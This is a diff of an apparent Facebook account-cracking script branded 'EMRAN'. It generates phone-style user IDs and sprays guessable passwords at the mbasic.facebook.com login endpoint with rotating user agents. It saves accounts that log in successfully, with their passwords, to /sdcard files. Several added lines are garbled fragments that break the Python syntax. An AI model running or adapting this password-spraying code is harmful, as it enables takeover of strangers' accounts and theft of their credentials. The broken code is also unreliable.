@@ -101,7 +101,7 @@ class Main:
         print(logo)
         print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
         print(" [01] \033[38;5;46m𝙍𝘼𝙉𝘿𝙊𝙈-𝙉𝙐𝙈𝘽𝙀𝙍-𝘾𝙇𝙊𝙉𝙀 [𝙒𝙊𝙍𝙆𝙄𝙉𝙂")
-        print(" [02] \033[38;5;46m𝙍𝘼𝙉𝘿𝙊𝙈-𝙂𝙈𝘼𝙄𝙇-𝘾𝙇𝙊𝙉𝙀 [𝙒𝙊𝙍𝙆𝙄𝙉𝙂] ")
+        pri-𝘾𝙇𝙊𝙉𝙀 [𝙒𝙊𝙍𝙆𝙄𝙉𝙂] ")
         print(" [00] \033[38;5;46m𝙀𝙓𝙄𝙏-𝙁𝙐𝘾𝙆-𝙔𝙊𝙐_𝘽𝙍𝙊🐼")
         print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
         Mumit =input(" [?] 𝘾𝙃𝙊𝙊𝙎𝙀___((((😊)))) : ")
@@ -135,13 +135,13 @@ def num():
         os.system('clear')
         print(logo)
         tl = str(len(user))
-        print(' \033[38;5;46m[+] 𝙏𝙊𝙏𝘼𝙇{{{𝙄𝘿𝙎}}}:\033[38;5;46m '+tl)
-        print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
+        \033[38;5;46m '+tl)
+        pr(f")
         print("\033[38;5;46m┌━━━━━━━━━━━━━━━┐        \033[38;5;46m┌━━━━━━━━━━━━━━━━┐")
         print(f'\033[38;5;46m│ \033[38;5;46m𝙔𝙊𝙐𝙍 𝘾𝙃𝙊𝙄𝘾𝙀   \033[38;5;46m│       \033[38;5;46m │    \033[38;5;46m𝙀𝙈𝙇/𝘾𝙇𝙊𝙉𝙀 \033[38;5;46m \033[38;5;46m │ ')
         print(f"\033[38;5;46m│ \033[38;5;46m𝘾𝙍𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏  \033[38;5;46m │     \033[38;5;46m   │   \033[38;5;46m𝙏𝙄𝙈𝙀/{dt_string}  \033[38;5;46m\033[38;5;46m │")
         print("\033[38;5;46m└━━━━━━━━━━━━━━━┘      \033[38;5;46m  └━━━━━━━━━━━━━━━━┘\n")
-        print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
+        print)
         for guru in user:
             uid = kode+kodex+kod+guru
             pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,]
@@ -167,7 +167,7 @@ def gml():
     print(logo)
     print(' [+] \033[38;5;46mEXAMPLE : 3000, 5000, 10000, 50000 ')
     
-    limit = int(input('[?] \033[38;5;46mCrack Limit : '))
+    limit = int(inpck Limit : '))
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(1,4))
         user.append(nmp)
@@ -176,12 +176,12 @@ def gml():
         print(logo)
         tl = str(len(user))
         print(' \033[38;5;46m[+] 𝙏𝙊𝙏𝘼𝙇{{{𝙄𝘿𝙎}}}:\033[38;5;46m '+tl)
-        print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
+        print(f" \033[)
         print("\033[38;5;46m┌━━━━━━━━━━━━━━━┐        \033[38;5;46m┌━━━━━━━━━━━━━━━━┐")
-        print(f'\033[38;5;46m│ \033[38;5;46m𝙔𝙊𝙐𝙍 𝘾𝙃𝙊𝙄𝘾𝙀   \033[38;5;46m│       \033[38;5;46m │    \033[38;5;46m𝙀𝙈𝙇/𝘾𝙇𝙊𝙉𝙀 \033[38;5;46m \033[38;5;46m │ ')
+     𝙍 𝘾𝙃𝙊𝙄𝘾𝙀   \033[38;5;46m│       \033[38;5;46m │    \033[38;5;46m𝙀𝙈𝙇/𝘾𝙇𝙊𝙉𝙀 \033[38;5;46m \033[38;5;46m │ ')
         print(f"\033[38;5;46m│ \033[38;5;46m𝘾𝙍𝘼𝘾𝙆 𝙎𝙏𝘼𝙍𝙏  \033[38;5;46m │     \033[38;5;46m   │   \033[38;5;46m𝙏𝙄𝙈𝙀/{dt_string}  \033[38;5;46m\033[38;5;46m │")
         print("\033[38;5;46m└━━━━━━━━━━━━━━━┘      \033[38;5;46m  └━━━━━━━━━━━━━━━━┘\n")
-        print(f" \033[38;5;46m❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥❥")
+        print(f" \0")
         for guru in user:
             uid = kode+kodex+guru+doamin
             pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
@@ -189,10 +189,6 @@ def gml():
     print(' [+] \033[38;5;46mCrack process has been completed')
     print(' [+] \033[38;5;46mIds saved in EMRAN-ok.txt,EMRAN-cp.txt')
 def rcrack1(uid,pwx,tl):
-    global loop
-    global cps
-    global oks
-    global proxy
     try:
         for ps in pwx:
             pro = random.choice(ugen)
@@ -230,25 +226,24 @@ def rcrack1(uid,pwx,tl):
             lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
+t_dict().items()])
+
                 print(f"\033[38;5;46m[EMRAN-OK🐼] {uid} | {ps}")
-                print(f" Cookie : {coki}")
+		
+            
                 open('/sdcard/EMRAN-ok.txt', 'a').write( uid+' | '+ps+'\n')
                 oks.append(uid)
                 break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[82:97]
-                #print(f"\x1b[38;5;196m[EMRAN-CP🍾] {uid}|{ps}")
+    ookies.get_dict().items()])
+       
+     MRAN-CP🍾] {uid}|{ps}")
                 #open('/sdcard/EMRAN-cp.txt', 'a').write( uid+' | '+ps+' \n')
                 cps.append(uid)
                 break
             else:
                 continue
-        loop+=1
-        sys.stdout.write(f'\r\033[38;5;46m[𝘽𝙊𝙎𝙎____𝙀𝙈𝙍𝘼𝙉] \033[38;5;46m%s\033[38;5;46m |\033[m[\033[38;5;46mOK:\033[\033[38;5;46m%s\033[38;5;46m] '%(loop,len(oks))),
+   
+  [38;5;46m[𝘽𝙊𝙎𝙎____𝙀𝙈𝙍𝘼𝙉] \033[38;5;46m%s\033[38;5;46m |\033[m[\033[38;5;46mOK:\033[\033[38;5;46m%s\033[38;5;46m] '%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
-Main()
